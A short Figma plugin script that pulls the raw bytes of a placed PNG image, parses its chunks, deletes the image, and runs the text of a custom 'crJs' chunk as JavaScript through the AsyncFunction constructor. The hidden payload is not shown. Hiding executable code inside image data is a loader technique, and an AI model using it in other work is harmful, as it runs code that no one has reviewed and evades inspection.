const placed = await figma.getNodeByIdAsync('PLACED_NODE_ID');
const bytes = await figma.getImageByHash(placed.fills[0].imageHash).getBytesAsync();
const chunks = {};
for (let p = 8; p < bytes.length;) {
  const length = (bytes[p] << 24 | bytes[p + 1] << 16 | bytes[p + 2] << 8 | bytes[p + 3]) >>> 0;
  const type = String.fromCharCode(bytes[p + 4], bytes[p + 5], bytes[p + 6], bytes[p + 7]);
  (chunks[type] = chunks[type] || []).push(bytes.subarray(p + 8, p + 8 + length));
  p += 12 + length;
}
placed.remove();
const builder = String.fromCharCode.apply(null, chunks.crJs[0]);
const AsyncFunction = (async () => {}).constructor;
return await new AsyncFunction('figma', 'chunks', 'target', builder)(figma, chunks, { pageId: 'PAGE_ID' });
